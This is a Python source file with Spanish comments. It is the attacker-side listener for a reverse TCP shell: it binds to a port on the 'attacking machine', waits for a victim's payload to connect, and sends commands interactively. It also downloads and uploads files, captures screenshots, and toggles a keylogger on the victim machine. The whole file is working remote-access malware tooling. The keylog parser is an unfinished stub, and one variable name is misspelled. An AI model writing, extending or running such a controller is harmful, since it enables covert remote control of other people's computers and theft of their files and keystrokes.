# Servidor para reverse TCP. Se configura un puerto de escucha para el payload
import socket
import json
import os


def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def download_file(file_name):
    ret = True
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            ret = False
    target.settimeout(None)
    f.close()
    return ret

    
def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())


def parse_log(file_name):
    # Por escribir. Método que parsea el archivo crudo recibido del keylogger
    pass

def target_communication():
    while True:
        command = input('* Shell~%s: ' %str(ip)).lower()
        reliable_send(command)
        spl_command = command.split()

        if spl_command[0] == 'quit':
            break
        elif spl_command[0] == 'cd':
            if len(spl_command) < 2:
                print("No se ha especficiado un directorio")
            else:
                pass
        elif spl_command[0] == 'clear':
            os.system('clear')
        elif spl_command[0] == 'download':
            if len(spl_command) < 2:
                print("No se ha especificado un archivo")
            else:
                download_file(spl_command[1])
        elif spl_command[0] == 'upload':
            if len(spl_command) < 2:
                print("No se ha especificado un archivo")
            else:
                upload_file(spl_command[1])
        elif spl_command[0] == 'screenshot':
            global screenshot_count
            if download_file('screenshot' + str(screenshot_count) + '.png'):
                print('Captura de pantalla guardada como screenshot' + str(screenshot_count) + '.png')
                screenshot_count += 1
            else:
                print('Error al recuperar la captura de pantalla')
        elif spl_command[0] == 'keylogger':
            global keylogger
            global keylogs
            if not keylogger:
                keylogger = True
                print('Registrando pulsación de teclas. Vuelve a introducir "keylogger" para detener el registro y recuperarlo como archivo')
            else:
                #while not reliable_recv() == 'OK':
                #    pass
                # download_file('keylog' + str(keylogs) + '.txt')
                #print('Registo de teclas guardado como keylog' + str(keylogs) + '.txt')
                parse_log('keylog' + str(key_logs) + '.txt')
                keylogger = False
                keylogs += 1              
        else:
            result = reliable_recv()
            print(result)

        #reliable_send(command)

screenshot_count = 0
keylogs = 0
keylogger = False

# AF_INET = IP     SOCK_STREAM = TCP
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# IP de la máquina atacante
sock.bind(('192.168.1.136', 5555))

print('[+] Esperando conexión entrante')
sock.listen(5)

# La función accept() de socket devuelve una pareja de valores, conexión y dirección. Conexión es un socket nuevo que se puede utiliar para enviar y recibir datos. Al asignar la pareja de variables a la función, cada variable contiene cada uno de los objetos retornados
target, ip = sock.accept()

print ('[+] Objetivo conectado desde: ' + str(ip))

target_communication()
